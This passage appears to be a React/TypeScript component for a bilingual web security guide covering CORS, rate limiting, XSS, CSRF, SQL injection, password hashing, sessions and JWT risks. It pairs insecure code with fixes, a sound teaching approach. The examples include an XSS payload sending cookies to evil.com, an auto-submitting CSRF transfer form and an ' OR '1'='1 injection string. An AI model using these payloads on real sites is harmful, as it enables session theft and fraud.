    headerPermissionsDesc: '控制哪些浏览器功能（摄像头、麦克风、地理位置）可以使用。限制应用不需要的功能，减少攻击面。',

    corsTitle: 'CORS 配置',
    corsIntro: '跨域资源共享 (CORS) 控制哪些源可以访问您的 API。错误配置的 CORS 可能允许恶意网站代表您的用户向您的 API 发出经过认证的请求。',
    corsOriginsTitle: '来源白名单',
    corsOriginsDesc: '当涉及凭据时，绝不使用通配符 (*) 作为来源。维护一个明确的允许来源白名单。在发送 Access-Control-Allow-Origin 之前，根据此白名单验证 Origin 头。',
    corsCredentialsTitle: '凭证和 Cookie',
    corsCredentialsDesc: '当 Access-Control-Allow-Credentials 为 true 时，必须指定明确的来源而非通配符。这控制浏览器是否在跨域请求中包含 Cookie 和授权头。',
    corsPreflightTitle: '预检请求',
    corsPreflightDesc: '浏览器在复杂的跨域请求前发送 OPTIONS 预检请求。使用适当的 Access-Control-Allow-Methods 和 Access-Control-Allow-Headers 响应。使用 Access-Control-Max-Age 缓存预检响应。',

    rateLimitTitle: '限流和 DDoS 防护',
    rateLimitIntro: '限流防止对 API 端点的滥用。没有它，攻击者可以暴力破解密码、抓取数据、轰炸端点并压垮基础设施。',
    rateLimitStrategiesTitle: '限流策略',
    rateLimitAuth: '认证端点',
    rateLimitAuthDesc: '对登录、注册和密码重置端点应用严格的速率限制。失败尝试后使用指数退避。N 次连续失败后实施账户锁定。',
    rateLimitAPI: 'API 限流',
    rateLimitAPIDesc: '按 IP 地址、用户 ID 和 API 密钥进行限流。使用滑动窗口算法以提高精度。返回 429 Too Many Requests 并带有 Retry-After 头。考虑免费层和付费层的不同限制。',
    ddosTitle: 'DDoS 缓解',
    ddosDesc: '使用 Cloudflare、Fastly 或 AWS Shield 等 CDN 提供商进行 DDoS 防护。在网络层实施连接速率限制。为慢速 HTTP 攻击设置激进的超时时间。',

    depsTitle: '依赖安全',
    depsIntro: '现代应用依赖数百甚至数千个第三方包。每个依赖项都是潜在的攻击面。供应链攻击（如 SolarWinds 漏洞）已经表明，受信任的包也可能被攻陷。',
    depsAuditTitle: '自动化漏洞扫描',
    depsAuditDesc: '在 CI 流水线中运行 npm audit、yarn audit 或 pnpm audit。集成 Snyk、Dependabot 或 GitHub Dependabot 以在发现漏洞时自动创建拉取请求。设置使构建失败的严重性阈值。',
    depsSBOMTitle: '软件物料清单 (SBOM)',
    depsSBOMDesc: 'SBOM 是软件中所有组件的正式记录。使用 Syft、CycloneDX 或 SPDX 等工具生成 SBOM。美国行政命令要求联邦软件提供 SBOM，企业采购中越来越多地被要求。',
    depsLockTitle: '锁定文件',
    depsLockDesc: '始终提交锁定文件（package-lock.json、yarn.lock、pnpm-lock.yaml）。锁定文件确保可重现的构建并防止依赖混淆攻击。在 CI/CD 中使用 npm ci 而非 npm install。',

    testingTitle: '安全测试',
    testingIntro: '安全测试应集成到软件开发生命周期的每个阶段，而不只是在部署前进行一次。',
    testingSASTTitle: '静态分析 (SAST)',
    testingSASTDesc: 'SAST 工具在不执行代码的情况下分析源代码。工具包括 Semgrep、ESLint 安全插件、SonarQube 和 CodeQL。集成到 IDE 和 CI 流水线中以获得即时反馈。',
    testingDASTTitle: '动态分析 (DAST)',
    testingDASTDesc: 'DAST 工具从外部测试运行中的应用程序。OWASP ZAP 和 Burp Suite 是流行的选择。在 CI 中针对暂存环境运行 DAST。捕获 XSS、注入和身份验证绕过等漏洞。',
    testingPentestTitle: '渗透测试',
    testingPentestDesc: '安全专业人员定期进行渗透测试提供全面的评估。使用 OWASP 测试指南等结构化方法。考虑漏洞赏金计划以进行持续的安全评估。',

    cvssTitle: 'CVSS 漏洞评分',
    cvssIntro: '通用漏洞评分系统 (CVSS) 提供了一种标准化的方式，在 0 到 10 的范围内对安全漏洞的严重性进行评级。',

    faqTitle: '常见问题',
    faq1q: '身份验证和授权的区别是什么？',
    faq1a: '身份验证验证你是谁（例如，用户名和密码检查）。授权确定你被允许做什么（例如，检查你是否有访问资源的权限）。两者都必须正确实现 — 没有授权的身份验证意味着所有用户可以访问所有资源，没有身份验证的授权意味着无法知道是谁在发出请求。',
    faq2q: 'HTTPS 足以保护 Web 应用程序吗？',
    faq2a: 'HTTPS 加密传输中的数据，但单独来看是不够的。你还需要：输入验证和输出编码以防止注入攻击、适当的身份验证和会话管理、对每个请求的授权检查、安全响应头、依赖项扫描和定期安全测试。HTTPS 防止网络窃听和中间人攻击，但不能防止应用层漏洞。',
    faq3q: '如何在 ORM 中防止 SQL 注入？',
    faq3a: '大多数 ORM（Prisma、TypeORM、Sequelize、Hibernate）默认对标准操作使用参数化查询。但你必须注意：原始查询方法（可以传递字符串模板）、用户输入决定排序列的 orderBy 或 orderByRaw 子句，以及动态列选择。始终使用 ORM 的安全 API 传递值，并对 ORDER BY 或 GROUP BY 子句中使用的用户输入进行白名单验证。',
    faq4q: 'JWT 访问令牌中应该存储什么？',
    faq4a: '在访问令牌中只存储必要的最小声明：用户 ID、角色/权限、过期时间（exp）、签发时间（iat）和签发者（iss）。绝不在 JWT 中存储密码、完整个人信息或财务数据等敏感数据。记住，JWT 有效载荷是 base64 编码的，不是加密的 — 除非使用 JWE（JSON Web 加密），否则任何拥有令牌的人都可以读取。',
    faq5q: '如何处理安全事件和漏洞披露？',
    faq5a: '在 /.well-known/security.txt 设置一个包含负责任披露政策和联系信息的 security.txt 文件。当漏洞被报告时：24 小时内确认，72 小时内修复严重漏洞，7 天内修复高危漏洞，向报告者传达进度，并考虑对重大漏洞进行 CVE 分配。考虑漏洞赏金计划以持续吸引研究人员。',
    faq6q: 'XSS 和 CSRF 的区别是什么？',
    faq6a: 'XSS（跨站脚本）将恶意脚本注入到您的页面中，在其他用户的浏览器中运行 — 攻击通过您的网站针对用户。CSRF（跨站请求伪造）诱使用户的浏览器向您的网站发出意外请求 — 攻击通过用户的浏览器针对您的网站。XSS 从目标网站的角度破坏了同源策略；CSRF 利用浏览器在跨域请求中包含凭证的行为。',
    faq7q: '我应该自己实现密码学吗？',
    faq7a: '几乎从不。密码学原语极难正确实现。即使是经验丰富的密码学家也会犯错。使用经过良好审计、广泛部署的库：浏览器中的 Web Crypto API、低级需求的 libsodium、密码哈希的 bcrypt/Argon2 库和经过实战验证的 TLS 库。原则是"不要自己实现密码学"(DYOR)。如果你真的需要自定义密码学原语，你需要正式的安全审计。',
    faq8q: '如何在生产环境中安全存储 API 密钥和机密？',
    faq8a: '绝不在源代码中硬编码机密或将其提交到版本控制中。使用机密管理解决方案：HashiCorp Vault、AWS Secrets Manager、Google Secret Manager 或 Azure Key Vault。对于容器，在运行时将机密注入为环境变量。尽可能使用自动轮换的短期凭证。审计机密访问日志。对于开发，使用 .env 文件（绝不提交），并使用 dotenv-vault 等工具进行团队共享。',
  },
};

const codeStyle: React.CSSProperties = {
  display: 'block',
  background: '#1e293b',
  color: '#e2e8f0',
  padding: '20px 24px',
  borderRadius: 8,
  fontSize: 13,
  lineHeight: 1.7,
  overflowX: 'auto',
  margin: '16px 0',
  fontFamily: '"Fira Code", "Cascadia Code", "JetBrains Mono", Consolas, monospace',
  whiteSpace: 'pre',
};

const tableStyle: React.CSSProperties = { width: '100%', borderCollapse: 'collapse', fontSize: 14, margin: '16px 0' };
const thStyle: React.CSSProperties = { textAlign: 'left', padding: '10px 12px', borderBottom: '2px solid var(--border-color)', fontWeight: 700, color: 'var(--text-primary)', background: 'var(--bg-input)' };
const tdStyle: React.CSSProperties = { padding: '10px 12px', borderBottom: '1px solid var(--border-color)', color: 'var(--text-secondary)', verticalAlign: 'top' };
const h2Style: React.CSSProperties = { fontSize: 22, fontWeight: 700, marginTop: 48, marginBottom: 16, color: 'var(--text-primary)' };
const h3Style: React.CSSProperties = { fontSize: 18, fontWeight: 600, marginTop: 32, marginBottom: 12, color: 'var(--text-primary)' };
const pStyle: React.CSSProperties = { color: 'var(--text-secondary)', lineHeight: 1.7, marginBottom: 12 };
const liStyle: React.CSSProperties = { color: 'var(--text-secondary)', lineHeight: 1.8, marginBottom: 6 };
const noteBoxStyle: React.CSSProperties = { background: 'rgba(59, 130, 246, 0.08)', border: '1px solid rgba(59, 130, 246, 0.3)', borderRadius: 8, padding: 16, margin: '12px 0' };
const warningBoxStyle: React.CSSProperties = { background: 'rgba(239, 68, 68, 0.08)', border: '1px solid rgba(239, 68, 68, 0.3)', borderRadius: 8, padding: 16, margin: '12px 0' };
const successBoxStyle: React.CSSProperties = { background: 'rgba(34, 197, 94, 0.08)', border: '1px solid rgba(34, 197, 94, 0.3)', borderRadius: 8, padding: 16, margin: '12px 0' };

export default function WebSecurityGuide({ lang }: { lang: string }) {
  const t = translations[lang] || translations['en'];

  const faqSchema = {
    '@context': 'https://schema.org',
    '@type': 'FAQPage',
    mainEntity: [
      { '@type': 'Question', name: t.faq1q, acceptedAnswer: { '@type': 'Answer', text: t.faq1a } },
      { '@type': 'Question', name: t.faq2q, acceptedAnswer: { '@type': 'Answer', text: t.faq2a } },
      { '@type': 'Question', name: t.faq3q, acceptedAnswer: { '@type': 'Answer', text: t.faq3a } },
      { '@type': 'Question', name: t.faq4q, acceptedAnswer: { '@type': 'Answer', text: t.faq4a } },
      { '@type': 'Question', name: t.faq5q, acceptedAnswer: { '@type': 'Answer', text: t.faq5a } },
      { '@type': 'Question', name: t.faq6q, acceptedAnswer: { '@type': 'Answer', text: t.faq6a } },
      { '@type': 'Question', name: t.faq7q, acceptedAnswer: { '@type': 'Answer', text: t.faq7a } },
      { '@type': 'Question', name: t.faq8q, acceptedAnswer: { '@type': 'Answer', text: t.faq8a } },
    ],
  };

  return (
    <div>
      <script type="application/ld+json" dangerouslySetInnerHTML={{ __html: JSON.stringify(faqSchema) }} />

      <p style={{ fontSize: 16, lineHeight: 1.8, color: 'var(--text-secondary)' }}>{t.intro}</p>

      {/* TL;DR Box */}
      <div style={{ background: '#f0f9ff', border: '1px solid #0ea5e9', borderRadius: 10, padding: '16px 20px', margin: '24px 0' }}>
        <p style={{ margin: 0, fontWeight: 700, fontSize: 15, color: '#0369a1' }}>{t.tldrTitle}</p>
        <p style={{ margin: '8px 0 0', fontSize: 14, color: '#0c4a6e', lineHeight: 1.7 }}>{t.tldrContent}</p>
      </div>

      {/* Key Takeaways Box */}
      <div style={{ background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: 10, padding: '16px 20px', margin: '24px 0' }}>
        <p style={{ margin: '0 0 10px', fontWeight: 700, fontSize: 15, color: '#1e293b' }}>{t.keyTakeawaysTitle}</p>
        <ul style={{ margin: 0, paddingLeft: 20 }}>
          <li style={{ fontSize: 14, color: '#475569', lineHeight: 1.7, marginBottom: 4 }}>{t.kt1}</li>
          <li style={{ fontSize: 14, color: '#475569', lineHeight: 1.7, marginBottom: 4 }}>{t.kt2}</li>
          <li style={{ fontSize: 14, color: '#475569', lineHeight: 1.7, marginBottom: 4 }}>{t.kt3}</li>
          <li style={{ fontSize: 14, color: '#475569', lineHeight: 1.7, marginBottom: 4 }}>{t.kt4}</li>
          <li style={{ fontSize: 14, color: '#475569', lineHeight: 1.7, marginBottom: 4 }}>{t.kt5}</li>
          <li style={{ fontSize: 14, color: '#475569', lineHeight: 1.7, marginBottom: 4 }}>{t.kt6}</li>
          <li style={{ fontSize: 14, color: '#475569', lineHeight: 1.7, marginBottom: 4 }}>{t.kt7}</li>
          <li style={{ fontSize: 14, color: '#475569', lineHeight: 1.7, marginBottom: 4 }}>{t.kt8}</li>
        </ul>
      </div>

      {/* ======================== OWASP TOP 10 ======================== */}
      <h2 style={h2Style}>{t.owaspTitle}</h2>
      <p style={pStyle}>{t.owaspIntro}</p>

      <div style={{ overflowX: 'auto', marginBottom: 24 }}>
        <table style={tableStyle}>
          <thead>
            <tr>
              <th style={thStyle}>#</th>
              <th style={thStyle}>{lang === 'zh' ? '类别' : 'Category'}</th>
              <th style={thStyle}>{lang === 'zh' ? '描述' : 'Description'}</th>
            </tr>
          </thead>
          <tbody>
            {[
              { id: 'A01', name: t.owaspA01, desc: t.owaspA01desc, color: '#ef4444' },
              { id: 'A02', name: t.owaspA02, desc: t.owaspA02desc, color: '#f97316' },
              { id: 'A03', name: t.owaspA03, desc: t.owaspA03desc, color: '#f59e0b' },
              { id: 'A04', name: t.owaspA04, desc: t.owaspA04desc, color: '#84cc16' },
              { id: 'A05', name: t.owaspA05, desc: t.owaspA05desc, color: '#22c55e' },
              { id: 'A06', name: t.owaspA06, desc: t.owaspA06desc, color: '#14b8a6' },
              { id: 'A07', name: t.owaspA07, desc: t.owaspA07desc, color: '#3b82f6' },
              { id: 'A08', name: t.owaspA08, desc: t.owaspA08desc, color: '#8b5cf6' },
              { id: 'A09', name: t.owaspA09, desc: t.owaspA09desc, color: '#ec4899' },
              { id: 'A10', name: t.owaspA10, desc: t.owaspA10desc, color: '#6366f1' },
            ].map((item) => (
              <tr key={item.id}>
                <td style={{ ...tdStyle, fontWeight: 700, color: item.color, whiteSpace: 'nowrap' }}>{item.id}</td>
                <td style={{ ...tdStyle, fontWeight: 600, whiteSpace: 'nowrap' }}>{item.name}</td>
                <td style={tdStyle}>{item.desc}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* ======================== XSS ======================== */}
      <h2 style={h2Style}>{t.xssTitle}</h2>
      <p style={pStyle}>{t.xssIntro}</p>

      <h3 style={h3Style}>{t.xssTypesTitle}</h3>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: 16, marginBottom: 24 }}>
        {[
          { title: t.xssReflectedTitle, desc: t.xssReflectedDesc, color: '#f59e0b', border: '1px solid rgba(245,158,11,0.3)', bg: 'rgba(245,158,11,0.06)' },
          { title: t.xssStoredTitle, desc: t.xssStoredDesc, color: '#ef4444', border: '1px solid rgba(239,68,68,0.3)', bg: 'rgba(239,68,68,0.06)' },
          { title: t.xssDOMTitle, desc: t.xssDOMDesc, color: '#8b5cf6', border: '1px solid rgba(139,92,246,0.3)', bg: 'rgba(139,92,246,0.06)' },
        ].map((card) => (
          <div key={card.title} style={{ background: card.bg, border: card.border, borderRadius: 8, padding: 16 }}>
            <p style={{ margin: '0 0 8px', fontWeight: 700, fontSize: 15, color: card.color }}>{card.title}</p>
            <p style={{ margin: 0, fontSize: 13, color: 'var(--text-secondary)', lineHeight: 1.6 }}>{card.desc}</p>
          </div>
        ))}
      </div>

      <h3 style={h3Style}>{t.xssPreventionTitle}</h3>

      <h3 style={{ ...h3Style, color: '#22c55e' }}>{t.xssOutputEncoding}</h3>
      <p style={pStyle}>{t.xssOutputEncodingDesc}</p>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 16 }}>
        <div>
          <div style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.4)', borderRadius: '6px 6px 0 0', padding: '6px 12px', fontSize: 12, fontWeight: 700, color: '#ef4444' }}>
            {lang === 'zh' ? '不安全 — 直接插入' : 'INSECURE — Direct Insertion'}
          </div>
          <pre style={{ ...codeStyle, margin: 0, borderRadius: '0 0 6px 6px', border: '1px solid rgba(239,68,68,0.3)', borderTop: 'none' }}><code>
            {"// DANGEROUS: Raw user input in HTML\n" +
             "const name = req.query.name;\n" +
             "res.send('<h1>Hello ' + name + '</h1>');\n\n" +
             "// Attacker input:\n" +
             "// ?name=<script>document.location='https://evil.com/steal?c='+document.cookie</script>"}
          </code></pre>
        </div>
        <div>
          <div style={{ background: 'rgba(34,197,94,0.1)', border: '1px solid rgba(34,197,94,0.4)', borderRadius: '6px 6px 0 0', padding: '6px 12px', fontSize: 12, fontWeight: 700, color: '#22c55e' }}>
            {lang === 'zh' ? '安全 — 输出编码' : 'SECURE — Output Encoding'}
          </div>
          <pre style={{ ...codeStyle, margin: 0, borderRadius: '0 0 6px 6px', border: '1px solid rgba(34,197,94,0.3)', borderTop: 'none' }}><code>
            {"// SAFE: Use a trusted escaping library\n" +
             "import { escape } from 'html-escaper';\n\n" +
             "const name = escape(req.query.name);\n" +
             "res.send('<h1>Hello ' + name + '</h1>');\n\n" +
             "// Output: &lt;script&gt;... (harmless)"}
          </code></pre>
        </div>
      </div>

      <h3 style={{ ...h3Style, color: '#22c55e' }}>{t.xssDOMPrevention}</h3>
      <p style={pStyle}>{t.xssDOMPreventionDesc}</p>
      <pre style={codeStyle}><code>
        {"// DANGEROUS: innerHTML with user data\n" +
         "element.innerHTML = userInput;\n\n" +
         "// SAFE: textContent (no HTML parsing)\n" +
         "element.textContent = userInput;\n\n" +
         "// SAFE: createElement API\n" +
         "const span = document.createElement('span');\n" +
         "span.textContent = userInput;\n" +
         "container.appendChild(span);\n\n" +
         "// SAFE with sanitization: DOMPurify\n" +
         "import DOMPurify from 'dompurify';\n" +
         "element.innerHTML = DOMPurify.sanitize(userInput);\n\n" +
         "// React is safe by default (JSX auto-escapes)\n" +
         "return <p>{userInput}</p>; // Safe\n" +
         "// But dangerouslySetInnerHTML is not:\n" +
         "return <div dangerouslySetInnerHTML={{__html: userInput}} />; // DANGER"}
      </code></pre>

      <h3 style={{ ...h3Style, color: '#22c55e' }}>{t.xssCSPTitle}</h3>
      <p style={pStyle}>{t.xssCSPDesc}</p>
      <pre style={codeStyle}><code>
        {"# Strong CSP header (Next.js / Express)\n" +
         "Content-Security-Policy:\n" +
         "  default-src 'self';\n" +
         "  script-src 'self' 'nonce-{RANDOM_NONCE}';\n" +
         "  style-src 'self' 'nonce-{RANDOM_NONCE}';\n" +
         "  img-src 'self' data: https:;\n" +
         "  font-src 'self';\n" +
         "  connect-src 'self' https://api.yourapp.com;\n" +
         "  frame-ancestors 'none';\n" +
         "  base-uri 'self';\n" +
         "  form-action 'self';\n" +
         "  upgrade-insecure-requests;\n\n" +
         "# Next.js: generate per-request nonce\n" +
         "// middleware.ts\n" +
         "import { NextRequest, NextResponse } from 'next/server';\n" +
         "import crypto from 'crypto';\n\n" +
         "export function middleware(request: NextRequest) {\n" +
         "  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');\n" +
         "  const csp = [\n" +
         "    \"default-src 'self'\",\n" +
         "    \"script-src 'self' 'nonce-\" + nonce + \"'\",\n" +
         "    \"style-src 'self' 'nonce-\" + nonce + \"'\",\n" +
         "    \"frame-ancestors 'none'\",\n" +
         "  ].join('; ');\n" +
         "  const response = NextResponse.next();\n" +
         "  response.headers.set('Content-Security-Policy', csp);\n" +
         "  response.headers.set('x-nonce', nonce);\n" +
         "  return response;\n" +
         "}"}
      </code></pre>

      {/* ======================== CSRF ======================== */}
      <h2 style={h2Style}>{t.csrfTitle}</h2>
      <p style={pStyle}>{t.csrfIntro}</p>

      <h3 style={h3Style}>{t.csrfHowTitle}</h3>
      <p style={pStyle}>{t.csrfHowDesc}</p>
      <pre style={codeStyle}><code>
        {"<!-- Attacker's malicious page (evil.com) -->\n" +
         "<html>\n" +
         "<body onload=\"document.forms[0].submit()\">\n" +
         "  <form action=\"https://bank.com/transfer\" method=\"POST\">\n" +
         "    <input type=\"hidden\" name=\"to\" value=\"attacker_account\" />\n" +
         "    <input type=\"hidden\" name=\"amount\" value=\"1000\" />\n" +
         "  </form>\n" +
         "</body>\n" +
         "</html>\n\n" +
         "<!-- If the user is logged into bank.com and visits evil.com,\n" +
         "     the browser auto-submits with the user's session cookie.\n" +
         "     bank.com processes it as a legitimate request. -->"}
      </code></pre>

      <h3 style={h3Style}>{t.csrfPreventionTitle}</h3>

      <h3 style={{ ...h3Style, color: '#22c55e' }}>{t.csrfSameSite}</h3>
      <p style={pStyle}>{t.csrfSameSiteDesc}</p>
      <pre style={codeStyle}><code>
        {"// Express.js: Set SameSite cookie\n" +
         "app.use(session({\n" +
         "  secret: process.env.SESSION_SECRET,\n" +
         "  cookie: {\n" +
         "    httpOnly: true,   // No JS access\n" +
         "    secure: true,     // HTTPS only\n" +
         "    sameSite: 'lax',  // CSRF protection\n" +
         "    maxAge: 3600000,  // 1 hour\n" +
         "  },\n" +
         "}));\n\n" +
         "// SameSite values:\n" +
         "// 'strict' - Never sent in cross-site requests (breaks OAuth flows)\n" +
         "// 'lax'    - Sent in safe cross-site navigation (GET links) only\n" +
         "// 'none'   - Always sent (requires Secure=true)"}
      </code></pre>

      <h3 style={{ ...h3Style, color: '#22c55e' }}>{t.csrfTokens}</h3>
      <p style={pStyle}>{t.csrfTokensDesc}</p>
      <pre style={codeStyle}><code>
        {"// Server: Generate and verify CSRF token\n" +
         "import crypto from 'crypto';\n\n" +
         "// Generate token on session creation\n" +
         "function generateCSRFToken(): string {\n" +
         "  return crypto.randomBytes(32).toString('hex');\n" +
         "}\n\n" +
         "// Middleware to verify token\n" +
         "function csrfMiddleware(req: Request, res: Response, next: NextFunction) {\n" +
         "  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {\n" +
         "    const token = req.headers['x-csrf-token'] || req.body._csrf;\n" +
         "    const sessionToken = req.session.csrfToken;\n" +
         "    if (!token || !sessionToken || token !== sessionToken) {\n" +
         "      return res.status(403).json({ error: 'CSRF token invalid' });\n" +
         "    }\n" +
         "  }\n" +
         "  next();\n" +
         "}\n\n" +
         "// Client: Include token in requests\n" +
         "// Fetch API\n" +
         "fetch('/api/transfer', {\n" +
         "  method: 'POST',\n" +
         "  headers: {\n" +
         "    'Content-Type': 'application/json',\n" +
         "    'X-CSRF-Token': getCSRFTokenFromCookie(),\n" +
         "  },\n" +
         "  body: JSON.stringify({ amount: 100, to: 'alice' }),\n" +
         "});"}
      </code></pre>

      {/* ======================== SQL INJECTION ======================== */}
      <h2 style={h2Style}>{t.sqlTitle}</h2>
      <p style={pStyle}>{t.sqlIntro}</p>

      <h3 style={h3Style}>{t.sqlHowTitle}</h3>
      <p style={pStyle}>{t.sqlHowDesc}</p>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 16, marginBottom: 24 }}>
        <div>
          <div style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.4)', borderRadius: '6px 6px 0 0', padding: '6px 12px', fontSize: 12, fontWeight: 700, color: '#ef4444' }}>
            {lang === 'zh' ? '不安全 — SQL 拼接' : 'INSECURE — String Concatenation'}
          </div>
          <pre style={{ ...codeStyle, margin: 0, borderRadius: '0 0 6px 6px', border: '1px solid rgba(239,68,68,0.3)', borderTop: 'none' }}><code>
            {"// DANGEROUS: Direct concatenation\n" +
             "const username = req.body.username;\n" +
             "const query = \"SELECT * FROM users \"\n" +
             "  + \"WHERE username = '\" + username + \"'\";\n\n" +
             "// Attack input:\n" +
             "// username = ' OR '1'='1\n" +
             "// Result query:\n" +
             "// SELECT * FROM users WHERE username = ''\n" +
             "//   OR '1'='1'\n" +
             "// Returns ALL users!"}
          </code></pre>
        </div>
        <div>
          <div style={{ background: 'rgba(34,197,94,0.1)', border: '1px solid rgba(34,197,94,0.4)', borderRadius: '6px 6px 0 0', padding: '6px 12px', fontSize: 12, fontWeight: 700, color: '#22c55e' }}>
            {lang === 'zh' ? '安全 — 参数化查询' : 'SECURE — Parameterized Query'}
          </div>
          <pre style={{ ...codeStyle, margin: 0, borderRadius: '0 0 6px 6px', border: '1px solid rgba(34,197,94,0.3)', borderTop: 'none' }}><code>
            {"// SAFE: Parameterized query (node-postgres)\n" +
             "const username = req.body.username;\n" +
             "const result = await pool.query(\n" +
             "  'SELECT * FROM users WHERE username = $1',\n" +
             "  [username]  // Passed separately\n" +
             ");\n\n" +
             "// Attack input is treated as literal data:\n" +
             "// SELECT * FROM users WHERE username = ?\n" +
             "// Param: ' OR '1'='1\n" +
             "// Returns 0 rows (no such username)"}
          </code></pre>
        </div>
      </div>

      <h3 style={{ ...h3Style, color: '#22c55e' }}>{t.sqlORM}</h3>
      <p style={pStyle}>{t.sqlORMDesc}</p>
      <pre style={codeStyle}><code>
        {"// Prisma (safe by default)\n" +
         "const user = await prisma.user.findUnique({\n" +
         "  where: { email: userInput },  // Safe\n" +
         "});\n\n" +
         "// Prisma raw query — be careful!\n" +
         "// DANGEROUS:\n" +
         "const results = await prisma.$queryRawUnsafe(\n" +
         "  'SELECT * FROM users WHERE email = ' + userEmail\n" +
         ");\n\n" +
         "// SAFE with tagged template:\n" +
         "const results = await prisma.$queryRaw`\n" +
         "  SELECT * FROM users WHERE email = ${userEmail}\n" +
         "`;\n\n" +
         "// TypeORM — safe with QueryBuilder:\n" +
         "const user = await userRepository\n" +
         "  .createQueryBuilder('user')\n" +
         "  .where('user.email = :email', { email: userInput })\n" +
         "  .getOne();\n\n" +
         "// ORDER BY — user controls sort column? Use whitelist!\n" +
         "const ALLOWED_SORT_COLUMNS = ['name', 'email', 'createdAt'];\n" +
         "const sortColumn = ALLOWED_SORT_COLUMNS.includes(req.query.sort)\n" +
         "  ? req.query.sort : 'createdAt';\n" +
         "// Now safe to use in ORDER BY"}
      </code></pre>

      {/* ======================== AUTHENTICATION ======================== */}
      <h2 style={h2Style}>{t.authTitle}</h2>
      <p style={pStyle}>{t.authIntro}</p>

      <h3 style={h3Style}>{t.authPasswordTitle}</h3>
      <p style={pStyle}>{t.authPasswordDesc}</p>
      <pre style={codeStyle}><code>
        {"// Node.js: bcrypt (battle-tested, widely used)\n" +
         "import bcrypt from 'bcryptjs';\n\n" +
         "// Hashing (on registration/password change)\n" +
         "const COST_FACTOR = 12; // ~250ms on modern hardware\n" +
         "const hash = await bcrypt.hash(plaintextPassword, COST_FACTOR);\n" +
         "await db.users.update({ passwordHash: hash }, { where: { id: userId } });\n\n" +
         "// Verification (on login)\n" +
         "const isValid = await bcrypt.compare(plaintextPassword, storedHash);\n" +
         "if (!isValid) {\n" +
         "  // Constant-time comparison prevents timing attacks\n" +
         "  throw new AuthError('Invalid credentials');\n" +
         "}\n\n" +
         "// Node.js: Argon2id (OWASP primary recommendation)\n" +
         "import argon2 from 'argon2';\n\n" +
         "const hash = await argon2.hash(plaintextPassword, {\n" +
         "  type: argon2.argon2id,\n" +
         "  memoryCost: 19456,  // 19 MiB\n" +
         "  timeCost: 2,        // 2 iterations\n" +
         "  parallelism: 1,     // 1 thread\n" +
         "});\n\n" +
         "const isValid = await argon2.verify(storedHash, plaintextPassword);\n\n" +
         "// Speed comparison (attacker perspective, GPU RTX 4090):\n" +
         "// MD5:      ~25 billion hashes/sec  <- Never use\n" +
         "// SHA-256:  ~10 billion hashes/sec  <- Never use\n" +
         "// bcrypt:   ~50,000 hashes/sec      <- Acceptable\n" +
         "// Argon2id: ~1,000 hashes/sec       <- Best"}
      </code></pre>

      <h3 style={h3Style}>{t.authMFATitle}</h3>
      <p style={pStyle}>{t.authMFADesc}</p>
      <pre style={codeStyle}><code>
        {"// TOTP (Time-based OTP) with otplib\n" +
         "import { authenticator } from 'otplib';\n\n" +
         "// Setup: Generate secret for new user\n" +
         "const secret = authenticator.generateSecret(); // 'JBSWY3DPEHPK3PXP'\n" +
         "const otpAuthUrl = authenticator.keyuri(\n" +
         "  userEmail,\n" +
         "  'YourApp',\n" +
         "  secret\n" +
         ");\n" +
         "// Show otpAuthUrl as QR code for user to scan\n" +
         "// Store secret (encrypted) in database\n\n" +
         "// Verification: Check TOTP code at login\n" +
         "const isValidOTP = authenticator.verify({\n" +
         "  token: req.body.totpCode,\n" +
         "  secret: user.totpSecret,\n" +
         "});\n" +
         "if (!isValidOTP) {\n" +
         "  throw new AuthError('Invalid OTP code');\n" +
         "}"}
      </code></pre>

      <h3 style={h3Style}>{t.authSessionTitle}</h3>
      <p style={pStyle}>{t.authSessionDesc}</p>
      <pre style={codeStyle}><code>
        {"// Secure session configuration (Express + Redis)\n" +
         "import session from 'express-session';\n" +
         "import RedisStore from 'connect-redis';\n" +
         "import { createClient } from 'redis';\n\n" +
         "const redisClient = createClient();\n" +
         "await redisClient.connect();\n\n" +
         "app.use(session({\n" +
         "  store: new RedisStore({ client: redisClient }),\n" +
         "  secret: process.env.SESSION_SECRET!, // 64+ random bytes\n" +
         "  name: '__Host-session',   // __Host- prefix enforces HTTPS + path=/\n" +
         "  resave: false,\n" +
         "  saveUninitialized: false,\n" +
         "  cookie: {\n" +
         "    httpOnly: true,         // No document.cookie access\n" +
         "    secure: true,           // HTTPS only\n" +
         "    sameSite: 'lax',        // CSRF protection\n" +
         "    maxAge: 60 * 60 * 1000, // 1 hour\n" +
         "  },\n" +
         "}));\n\n" +
         "// Regenerate session ID after login (prevents session fixation)\n" +
         "req.session.regenerate((err) => {\n" +
         "  if (err) throw err;\n" +
         "  req.session.userId = user.id;\n" +
         "  req.session.roles = user.roles;\n" +
         "});"}
      </code></pre>

      {/* ======================== JWT ======================== */}
      <h2 style={h2Style}>{t.jwtTitle}</h2>
      <p style={pStyle}>{t.jwtIntro}</p>

      <div style={warningBoxStyle}>
        <p style={{ margin: 0, fontWeight: 700, color: '#dc2626' }}>
          {lang === 'zh' ? 'JWT 关键安全风险' : 'Critical JWT Security Risks'}
        </p>
        <ul style={{ margin: '8px 0 0', paddingLeft: 20 }}>
          <li style={liStyle}><strong>alg: none</strong> — {lang === 'zh' ? '将算法设为 "none" 完全绕过签名验证' : 'Setting algorithm to "none" bypasses verification entirely'}</li>
          <li style={liStyle}><strong>Algorithm Confusion</strong> — {lang === 'zh' ? '攻击者将 RS256 降级为 HS256，用公钥作为 HMAC 密钥' : 'Attacker downgrades RS256 to HS256, using public key as HMAC secret'}</li>
          <li style={liStyle}><strong>Weak secrets</strong> — {lang === 'zh' ? 'HS256 需要至少 256 位密钥，避免可猜测的密钥' : 'HS256 requires at least 256-bit secret; avoid guessable secrets'}</li>
          <li style={liStyle}><strong>No expiration</strong> — {lang === 'zh' ? '没有 exp 声明的令牌永远有效' : 'Tokens without exp claim are valid forever'}</li>
        </ul>
      </div>

      <h3 style={{ ...h3Style, color: '#22c55e' }}>{t.jwtAlgoTitle}</h3>
